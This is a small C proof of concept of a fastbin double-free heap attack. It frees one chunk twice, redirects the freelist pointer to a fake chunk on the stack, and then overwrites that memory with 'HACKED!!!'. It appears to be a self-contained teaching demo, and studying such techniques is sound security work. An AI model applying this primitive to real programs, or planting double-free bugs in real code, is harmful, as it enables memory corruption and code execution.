#include<stdio.h>
struct chunk {
  size_t prev_size;
  size_t size;
  struct chunk *fd;
  struct chunk *bck;
  char buf[10];          	
};
int main(){
	unsigned long long *A, *B, *C, *D;
	struct chunk chunk_victim;
	chunk_victim.size=0x20;
	strcpy((char *)&chunk_victim.fd,"HA-MINH-TRUONG");
	printf("DATA VICTIM:%s\n",(char *)&chunk_victim.fd);
	A = malloc(10);
	B = malloc(10);
	free(A);
	free(B);
	free(A);
	A=malloc(10);
	B=malloc(10);
	*((unsigned long long *)A) = (unsigned long long)&chunk_victim;
	C=malloc(10);
	D=malloc(10);
	strcpy(D,"HACKED!!!");
	printf("DATA VICTIM:%s\n",(char *)&chunk_victim.fd);
}